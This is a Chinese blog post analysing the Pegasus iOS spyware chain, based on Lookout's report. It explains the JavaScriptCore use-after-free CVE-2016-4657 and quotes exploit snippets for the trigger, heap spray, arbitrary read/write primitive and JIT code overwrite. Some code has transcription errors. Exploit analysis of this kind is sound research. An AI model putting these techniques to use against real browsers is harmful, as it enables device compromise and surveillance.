<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-135283153-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>pegasus分析 | FINSENTY54</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。阶段二：越狱。在第">
<meta name="keywords" content="ios">
<meta property="og:type" content="article">
<meta property="og:title" content="pegasus分析">
<meta property="og:url" content="http://finsenty54.github.io/2019/04/16/pegasus分析/index.html">
<meta property="og:site_name" content="FINSENTY54">
<meta property="og:description" content="PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。阶段二：越狱。在第">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://s2.ax1x.com/2019/04/18/ESiMgf.png">
<meta property="og:updated_time" content="2019-04-19T03:25:16.729Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="pegasus分析">
<meta name="twitter:description" content="PEGASUS攻击分析参考 lookout report攻击过程受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。 阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。阶段二：越狱。在第">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/18/ESiMgf.png">
<meta name="twitter:creator" content="@fin12138">
  
    <link rel="alternate" href="/atom.xml" title="FINSENTY54" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">FINSENTY54</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">你看那云聚了又散，散了又聚</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://finsenty54.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-pegasus分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/16/pegasus分析/" class="article-date">
  <time datetime="2019-04-16T08:54:59.000Z" itemprop="datePublished">2019-04-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      pegasus分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report" target="_blank" rel="noopener">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p>
<h5 id="阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。"><a href="#阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。" class="headerlink" title="阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。"></a>阶段一：传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</h5><h5 id="阶段二：越狱。在第一阶段中会根据设备（32-64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞-CVE-2016-4655和CVE-2016-4656-的exp还有一个用来下载解密第三阶段软件包的loader。"><a href="#阶段二：越狱。在第一阶段中会根据设备（32-64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞-CVE-2016-4655和CVE-2016-4656-的exp还有一个用来下载解密第三阶段软件包的loader。" class="headerlink" title="阶段二：越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。"></a>阶段二：越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</h5><h5 id="阶段三：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。"><a href="#阶段三：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。" class="headerlink" title="阶段三：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。"></a>阶段三：安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</h5><p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p>
<h3 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h3><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()</strong>函数中存在这个漏洞，并且可以在静态方法<strong>definePropertries()</strong>中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="keyword">for</span>(size_t i =<span class="number">0</span>;i&lt;numProperties;i++)&#123;</span><br><span class="line">	JSValue prop = properties-&gt;<span class="keyword">get</span>(exec,propertyNames[i]);</span><br><span class="line">	if(exec-&gt;hadException())</span><br><span class="line">		return jsNull();</span><br><span class="line">	PropertyDescriptor descriptor;</span><br><span class="line">	if(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">		return jsNull();</span><br><span class="line">	descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(size_t i=<span class="number">0</span>;i&lt;numProperties; i++)&#123;</span><br><span class="line">	Identifier propertyName = propertyNames[i];</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p>
<p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p>
<p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">	...</span><br><span class="line">	public:</span><br><span class="line">	...</span><br><span class="line">		MarkedArgumentBuffer()</span><br><span class="line">			:m_size(<span class="number">0</span>)</span><br><span class="line">			,m_capacity(inlineCapacity)</span><br><span class="line">			,m_buffer(m_inlineBuffer)</span><br><span class="line">			,m_markSet(<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">void</span> append(JSValue v)&#123;</span><br><span class="line">		<span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line">			<span class="keyword">return</span> slowAppend(v);</span><br><span class="line">		</span><br><span class="line">		slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">		++m_size;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">	...</span><br><span class="line">		int m_size;</span><br><span class="line">		int m_capacity;</span><br><span class="line">		EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">		EncodeedJSValue* m_buffer;</span><br><span class="line">		ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::slowAppend(JSValue v)&#123;</span><br><span class="line">	int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">	EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">		newBuffer[i]=m_buffer[i];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line">		<span class="keyword">delete</span> [] base;</span><br><span class="line">	</span><br><span class="line">	m_buffer=newBuffer;</span><br><span class="line">	m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor's inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don't need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector's inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">	Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line">	<span class="keyword">if</span>(!heap)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">	m_markSet-&gt;add(<span class="keyword">this</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inline Heap* Heap::heap(<span class="keyword">const</span> JSValue v)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!v.isCell())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。<strong>JSValue::isCell() </strong>函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a href="https://imgchr.com/i/ESiMgf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p>
<h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	arr=<span class="literal">null</span>;</span><br><span class="line">	props[<span class="string">"stale"</span>][<span class="string">'value'</span>]=<span class="literal">null</span>;</span><br><span class="line">	...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">	p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">	p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">	p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">	p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">	p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">	p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">	p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">	length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">	stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">	after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure></p>
<p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p>
<p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++)&#123;</span><br><span class="line">		pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line">	<span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line">	<span class="keyword">for</span>(i =<span class="number">0</span>;i&lt;attempts.length;i++)&#123;</span><br><span class="line">		attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p>
<p>完成后，会检测垃圾回收是否触发。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="keyword">if</span>(before_len==after_len)&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p>
<h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p>
<p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x=attempts.length<span class="number">-1</span>;x&gt;=<span class="number">1</span>;x--)&#123;</span><br><span class="line">	<span class="keyword">if</span>(attempts[x].length != <span class="number">80</span>/<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(attempts[x].length==<span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">			memory_view=attempts[x];</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p>
<h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">	body+=<span class="string">'try &#123;&#125; catch(e);'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,body);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p>
